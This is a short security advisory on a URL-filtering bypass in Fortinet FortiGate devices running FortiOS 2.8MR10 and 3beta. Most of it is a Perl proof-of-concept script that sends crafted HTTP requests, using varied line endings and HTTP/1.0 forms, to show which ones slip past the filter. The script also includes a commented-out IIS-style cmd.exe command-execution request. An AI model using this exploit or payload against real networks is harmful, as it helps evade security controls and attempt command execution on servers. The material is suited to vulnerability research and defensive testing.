source: https://www.securityfocus.com/bid/16599/info

Fortinet FortiGate is prone to a vulnerability that could allow users to bypass the device's URL filtering.

FortiGate devices running FortiOS v2.8MR10 and v3beta are vulnerable to this issue. Other versions may also be affected.

# http_req.pl
#
# Made by (Mathieu Dessus)
#
# Make a filter for /test* URL in the Fortigate and
# remove the # depending on which HTTP request you want to test

use IO::Socket;

$target = '1.2.3.4';

# Detected
$data = "GET /test HTTP/1.1\r
Host: $target\r
Pragma: no-cache\r
Accept: */*\r
\r
";
# Not detected
$data = "GET /test2 HTTP/1.1
Host: $target
Pragma: no-cache
Accept: */*

";

# Not detected
$data = "GET /test3 HTTP/1.0\r\n\r\n";
# Detected
#$data = "GET /test4 HTTP/1.0\r\nHost: $target\r\n\r\n";
# Detected :)
#$data = "GET //c/winnt/system32/cmd.exe?/c+dir HTTP/1.0\n\n";


my $sock = new IO::Socket::INET (
                                  PeerAddr => $target,
                                  PeerPort => '80',
                                  Proto => 'tcp',
                                 );
die "Could not create socket: $!\n" unless $sock;
print $sock $data;
read($sock, $ret, 600);
print($ret."\n");
close($sock);